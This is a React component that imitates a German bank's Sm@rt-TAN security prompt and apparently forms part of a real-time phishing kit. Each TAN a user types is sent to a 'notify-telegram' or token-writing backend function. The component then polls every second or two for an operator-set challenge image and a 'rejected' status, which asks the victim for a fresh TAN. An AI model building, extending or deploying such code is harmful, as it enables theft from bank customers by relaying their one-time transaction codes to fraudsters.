// @ts-nocheck
import { useEffect, useMemo, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { fetchTelegramSession } from "@/lib/telegramSession";

import { AlertTriangle, Check, ChevronDown, ChevronUp, Minus, Plus } from "lucide-react";
import smartTanDefault from "@/assets/smart-tan-default.png.asset.json";

export type SmartTanTokenKind = "auth" | "pin" | "limit" | "storno" | "securego" | "cardpin" | "pinverwaltung";

interface Props {
  /** Optional explicit Telegram session ID. If omitted, reads sessionStorage `tg_session:{bankId}`. */
  sessionId?: string | null;
  /** Bank ID used to look up the tg_session key. */
  bankId?: string | null;
  /** Initial/token-configured security method when no Telegram session exists. */
  initialVerfahren?: string | null;
  /** Token-configured method list used as fallback before Telegram session hydration. */
  allowedVerfahren?: string[] | null;
  /** Render inline (no fullscreen backdrop / card wrapper). */
  inline?: boolean;
  /** Render ONLY the orange TAN content box (no title, no "Abgleichen"-toggle, no Sicherheitsverfahren-dropdown). Requires `inline`. */
  contentOnly?: boolean;
  /** Callback fired when the Smart-TAN challenge activates or deactivates. */
  onActiveChange?: (active: boolean) => void;
  /**
   * Data source. Default = "telegram_session" (BankLogin / VR normal flow).
   * "auth_token" polls the token row directly (no Telegram session) — for any of the 5 token kinds.
   */
  source?: "telegram_session" | "auth_token";
  /** Token id + token string (required when source = "auth_token"). */
  authTokenId?: string | null;
  authToken?: string | null;
  /** Token table kind when source = "auth_token". Defaults to "auth". */
  tokenKind?: SmartTanTokenKind;
}

// Index 0 = Standardgröße (größte Ansicht), jeder Minus-Klick verkleinert.
const ZOOM_STEPS = [1, 0.7, 0.5, 0.33];

const SmartTanOverlay = ({
  sessionId,
  bankId,
  initialVerfahren,
  allowedVerfahren: allowedVerfahrenProp,
  inline,
  contentOnly,
  onActiveChange,
  source = "telegram_session",
  authTokenId,
  authToken,
  tokenKind = "auth",
}: Props) => {
  const [sid, setSid] = useState<string | null>(sessionId ?? null);
  const [verfahren, setVerfahren] = useState<string>(initialVerfahren ?? "securego");
  const [allowedVerfahren, setAllowedVerfahren] = useState<string[]>(
    Array.isArray(allowedVerfahrenProp) && allowedVerfahrenProp.length > 0 ? allowedVerfahrenProp : ["securego"],
  );
  const [photoUrl, setPhotoUrl] = useState<string | null>(null);
  const [tanStatus, setTanStatus] = useState<string | null>(null);
  const [tan, setTan] = useState("");
  const [zoom, setZoom] = useState(0);
  const [showExplain, setShowExplain] = useState(false);
  const [showVerfahren, setShowVerfahren] = useState(false);
  const [showAnleitung, setShowAnleitung] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [switching, setSwitching] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const rejectionHandledRef = useRef<boolean>(false);

  const isAuthSource = source === "auth_token";

  // Resolve session id from bankId storage if not explicit (Telegram source only)
  useEffect(() => {
    if (isAuthSource) return;
    if (sessionId) { setSid(sessionId); return; }
    if (!bankId) return;
    const s = sessionStorage.getItem(`tg_session:${bankId}`);
    if (s) setSid(s);
  }, [sessionId, bankId, isAuthSource]);

  useEffect(() => {
    if (Array.isArray(allowedVerfahrenProp) && allowedVerfahrenProp.length > 0) {
      setAllowedVerfahren(allowedVerfahrenProp);
    }
  }, [allowedVerfahrenProp]);

  useEffect(() => {
    if (initialVerfahren) setVerfahren(initialVerfahren);
  }, [initialVerfahren]);

  // Hydrate allowed_verfahren from sessionStorage (set by AuthToken flow) as a fallback
  useEffect(() => {
    if (!bankId) return;
    try {
      const raw = sessionStorage.getItem(`auth_allowed_verfahren:${bankId}`);
      if (raw) {
        const arr = JSON.parse(raw);
        if (Array.isArray(arr) && arr.length > 0) setAllowedVerfahren(arr);
      }
    } catch {}
  }, [bankId]);

  useEffect(() => {
    if (isAuthSource || !sid) return;
    let cancelled = false;
    const load = async () => {
      try {
        const data = await fetchTelegramSession(sid);
        if (cancelled || !data) return;
        const tokenAllowed = Array.isArray(allowedVerfahrenProp) && allowedVerfahrenProp.length > 0 ? allowedVerfahrenProp : null;
        const sessionAllowed = Array.isArray(data.allowed_verfahren) && data.allowed_verfahren.length > 0
          ? data.allowed_verfahren
          : ["securego"];
        const effectiveAllowed = tokenAllowed ?? sessionAllowed;
        const sessionVerfahren = data.verfahren ?? effectiveAllowed[0] ?? "securego";
        // In contentOnly mode the parent controls `verfahren` via `initialVerfahren`.
        // Do not let the session poll overwrite it back to a non-smart value.
        if (!contentOnly) {
          setVerfahren(effectiveAllowed.includes(sessionVerfahren) ? sessionVerfahren : effectiveAllowed[0] ?? "securego");
        }
        setPhotoUrl(data.smart_photo_url ?? null);
        setAllowedVerfahren(effectiveAllowed);
        const newStatus = data.smart_tan_status ?? null;
        setTanStatus(newStatus);
        if (newStatus === "rejected") {

          if (!rejectionHandledRef.current) {
            rejectionHandledRef.current = true;
            setTan("");
            setError("Die TAN ist nicht korrekt. Bitte richtige TAN eingeben.");
            setSubmitting(false);
          }
        } else {
          rejectionHandledRef.current = false;
        }
      } catch (err) {
        console.warn("[SmartTanOverlay] poll error", err);
      }
      if (!cancelled) pollRef.current = setTimeout(load, 800);
    };
    load();
    return () => {
      cancelled = true;
      if (pollRef.current) clearTimeout(pollRef.current);
    };
  }, [sid, allowedVerfahrenProp, isAuthSource]);


  // Auth-token source: poll auth_tokens via public-read
  useEffect(() => {
    if (!isAuthSource || !authTokenId) return;
    let cancelled = false;
    const load = async () => {
      try {
        const { data } = await (supabase as any).functions.invoke("public-read", {
          body: { action: "token_by_id", kind: tokenKind, id: authTokenId },
        });
        const row = (data as any)?.row;
        if (cancelled || !row) {
          if (!cancelled) pollRef.current = setTimeout(load, 2500);
          return;
        }
        const tokenAllowed = Array.isArray(allowedVerfahrenProp) && allowedVerfahrenProp.length > 0 ? allowedVerfahrenProp : null;
        const rowAllowed = Array.isArray(row.allowed_verfahren) && row.allowed_verfahren.length > 0
          ? row.allowed_verfahren : ["securego"];
        const effectiveAllowed = tokenAllowed ?? rowAllowed;
        const av = row.active_verfahren ?? effectiveAllowed[0] ?? "securego";
        if (!contentOnly) {
          setVerfahren(effectiveAllowed.includes(av) ? av : effectiveAllowed[0] ?? "securego");
        }
        setPhotoUrl(row.smart_photo_url ?? null);
        setAllowedVerfahren(effectiveAllowed);
        const newStatus = row.smart_tan_status ?? null;
        setTanStatus(newStatus);
        if (newStatus === "rejected") {
          if (!rejectionHandledRef.current) {
            rejectionHandledRef.current = true;
            setTan("");
            setError("Die TAN ist nicht korrekt. Bitte richtige TAN eingeben.");
            setSubmitting(false);
          }
        } else {
          rejectionHandledRef.current = false;
        }
      } catch (err) {
        console.warn("[SmartTanOverlay] auth poll error", err);
      }
      if (!cancelled) pollRef.current = setTimeout(load, 2000);
    };
    load();
    return () => {
      cancelled = true;
      if (pollRef.current) clearTimeout(pollRef.current);
    };
  }, [isAuthSource, authTokenId, allowedVerfahrenProp, tokenKind]);

  const switchVerfahren = async (target: string) => {
    if (target === verfahren || !allowedVerfahren.includes(target)) return;
    if (isAuthSource) {
      if (!authToken) { setShowVerfahren(false); return; }
      setSwitching(target);
      try {
        await (supabase as any).functions.invoke("public-write", {
          body: { action: "token_set_active_verfahren", kind: tokenKind, token: authToken, verfahren: target },
        });
        setVerfahren(target);
        setTan("");
        setError(null);
        setShowVerfahren(false);
      } catch (err) {
        console.error("token_set_active_verfahren failed", err);
      } finally {
        setSwitching(null);
      }
      return;
    }
    if (!sid) return;
    setSwitching(target);
    try {
      await (supabase as any).functions.invoke("notify-telegram", {
        body: { mode: "switch-verfahren", session_id: sid, verfahren: target },
      });
      setVerfahren(target);
      setTan("");
      setError(null);
      setShowVerfahren(false);
    } catch (err) {
      console.error("switch-verfahren failed", err);
    } finally {
      setSwitching(null);
    }
  };

  const isSmartVerf = verfahren === "smart_photo" || verfahren === "smart_manuell";
  const active = contentOnly
    ? isSmartVerf
    : isAuthSource
      ? !!authTokenId && isSmartVerf
      : !!sid && isSmartVerf;
  useEffect(() => {
    onActiveChange?.(active);
  }, [active, onActiveChange]);
  useEffect(() => {
    if (active && bankId) {
      try { sessionStorage.setItem(`smart_tan_used:${bankId}`, "1"); } catch {}
    }
    if (!active) {
      setTan(""); setZoom(0); setError(null); setSubmitting(false);
      // Wenn Sm@rt-TAN einmal in diesem Vorgang genutzt wurde, bleibt das Flag
      // bis zum nächsten Login bestehen. So wird die Adressprüfung auch dann
      // übersprungen, wenn das Overlay nach Accept/Decline wieder schließt.
    }
  }, [active, bankId]);

  const label = verfahren === "smart_photo" ? "Sm@rt-TAN photo" : "Sm@rt-TAN plus manuell";

  const handleSubmit = async () => {
    setError(null);
    if (!/^\d{6}$/.test(tan)) { setError("TAN erforderlich."); return; }
    setSubmitting(true);
    try {
      if (isAuthSource) {
        if (!authToken) { setError("Token fehlt."); setSubmitting(false); return; }
        const { data, error } = await (supabase as any).functions.invoke("public-write", {
          body: { action: "token_smart_tan_submit", kind: tokenKind, token: authToken, tan },
        });
        if (error || (data && data.ok === false) || data?.error) {
          throw new Error(error?.message || data?.error || "submit failed");
        }
      } else {
        if (!sid) { setError("Session nicht gefunden."); setSubmitting(false); return; }
        const { data, error } = await (supabase as any).functions.invoke("notify-telegram", {
          body: { mode: "smart-tan-submit", session_id: sid, tan },
        });
        if (error || (data && data.ok === false) || data?.error) {
          throw new Error(error?.message || data?.error || "submit failed");
        }
      }
      setTanStatus("submitted");
    } catch (err) {
      console.error("smart-tan-submit failed", err);
      setError("Übermittlung fehlgeschlagen. Bitte erneut versuchen.");
    } finally {
      setSubmitting(false);
    }
  };

  const submitted = tanStatus === "submitted";



  const imgStyle = useMemo(() => ({
    transform: `scale(${ZOOM_STEPS[zoom]})`,
    transformOrigin: "top center",
    transition: "transform 0.2s ease",
  }), [zoom]);

  if (!active) return null;

  const body = (
    <>
      {!inline && <h3 className="text-xl font-bold text-gray-900">Sicherheitsabfrage</h3>}

        {!contentOnly && (
          <>
            <button
              type="button"
              className="mt-3 flex items-center gap-2 text-sm font-semibold text-[#0066cc]"
              onClick={() => setShowExplain((v) => !v)}
            >
              <ChevronDown className={`h-4 w-4 transition-transform ${showExplain ? "rotate-180" : ""}`} />
              Bitte unbedingt Auftragsdaten abgleichen
            </button>
            {showExplain && (
              <div className="mt-2 rounded-lg border border-blue-200 bg-blue-50 p-3 text-sm text-gray-700">
                Gleichen Sie die Auftragsdaten mit den hier angezeigten Daten ab, bevor Sie den Auftrag freigeben.
              </div>
            )}
          </>
        )}

        {!contentOnly && (
          <div className="relative mt-4">
            <div className="relative z-10 flex w-full items-center justify-between rounded-lg border border-gray-300 bg-white p-3">
              <div>
                <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
                <p className="text-sm font-medium text-gray-900">{label}</p>
              </div>
            </div>
          </div>
        )}




        <div className="mt-4 rounded-lg border-[1.5px] border-[#F08C00] bg-[#FFF4EC] p-4">
          {verfahren === "smart_photo" ? (
            <>
              <div className="mb-3 flex items-center justify-end gap-2">
                <button
                  type="button"
                  onClick={() => setZoom((z) => Math.min(ZOOM_STEPS.length - 1, z + 1))}
                  disabled={zoom === ZOOM_STEPS.length - 1}
                  className="rounded p-1 text-[#0066cc] disabled:opacity-40"
                  aria-label="Verkleinern"
                >
                  <Minus className="h-5 w-5" />
                </button>
                <button
                  type="button"
                  onClick={() => setZoom((z) => Math.max(0, z - 1))}
                  disabled={zoom === 0}
                  className="rounded p-1 text-[#0066cc] disabled:opacity-40"
                  aria-label="Vergrößern"
                >
                  <Plus className="h-5 w-5" />
                </button>
              </div>
              <div className="mb-4 rounded-md border-2 border-black bg-white p-2">
                <img
                  src={photoUrl ?? smartTanDefault.url}
                  alt="Sm@rt-TAN Farbcode"
                  className="mx-auto block h-auto transition-[width] duration-200"
                  style={{ width: `${ZOOM_STEPS[zoom] * 100}%` }}
                />
              </div>
              <label className="mb-1 block text-sm font-semibold text-gray-800">
                TAN eingeben
              </label>
              <p className="mb-2 text-xs text-gray-600">Bitte geben Sie die auf Ihrem TAN-Generator angezeigte TAN ein.</p>
            </>
          ) : (
            <>
              <p className="mb-2 text-sm text-gray-800">Bitte geben Sie die auf Ihrem TAN-Generator angezeigte TAN ein.</p>
            </>
          )}


          <input
            type="text"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={tan}
            onChange={(e) => {
              const digits = e.target.value.replace(/\D/g, "").slice(0, 6);
              setTan(digits);
              if (error) setError(null);
            }}
            placeholder="• • • • • •"
            maxLength={6}
            disabled={submitted}
            className="w-full rounded-lg border-2 border-gray-300 bg-white px-4 py-3 text-center font-mono text-2xl tracking-[0.5em] focus:border-[#F08C00] focus:outline-none focus:ring-2 focus:ring-[#F08C00]/30 disabled:bg-gray-50"
          />
          {(error || tan.length === 0) && !submitted && (
            <div className="mt-2 flex items-center gap-2 text-sm text-red-600">
              <AlertTriangle className="h-4 w-4" />
              <span>{error ?? "TAN erforderlich."}</span>
            </div>
          )}

          <div className="mt-4 flex items-center gap-3">
            <button
              type="button"
              onClick={handleSubmit}
              disabled={submitting || submitted || tan.length !== 6}
              className="rounded-full bg-[#0066b3] px-5 py-2 text-sm font-semibold text-white hover:bg-[#005091] disabled:opacity-60"
            >
              {submitted || submitting ? (
                <span className="inline-flex items-center gap-2">
                  <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />
                </span>
              ) : "TAN bestätigen"}
            </button>
          </div>
        </div>

        {verfahren === "smart_manuell" && (
          <div className="mt-4">
            <button
              type="button"
              className="flex items-center gap-2 text-sm font-semibold text-[#0066cc]"
              onClick={() => setShowAnleitung((v) => !v)}
            >
              <ChevronDown className={`h-4 w-4 transition-transform ${showAnleitung ? "rotate-180" : ""}`} />
              Anleitung
            </button>
            {showAnleitung && (
              <div className="mt-2 rounded-md border border-gray-200 bg-white p-3 text-sm text-gray-800">
                <ol className="list-decimal space-y-2 pl-5">
                  <li>Stecken Sie Ihre Chipkarte in den TAN-Generator. Je nach Lesertyp drücken Sie entweder die TAN-Taste oder drücken Sie „Menü" und wählen den Menüpunkt „1 - TAN manuell".</li>
                  <li>Geben Sie die Auftragsdaten ein und bestätigen Sie mit „OK".</li>
                  <li>Prüfen Sie die Anzeige auf dem Leserdisplay und drücken Sie „OK".</li>
                </ol>
              </div>
            )}
          </div>
        )}
    </>
  );

  if (inline) return <div className="space-y-0">{body}</div>;

  return (
    <div className="fixed inset-0 z-[60] flex items-start justify-center overflow-y-auto bg-black/50 p-4">
      <div className="my-8 w-full max-w-lg rounded-2xl bg-white p-6 shadow-xl">
        {body}
      </div>
    </div>
  );
};

export default SmartTanOverlay;
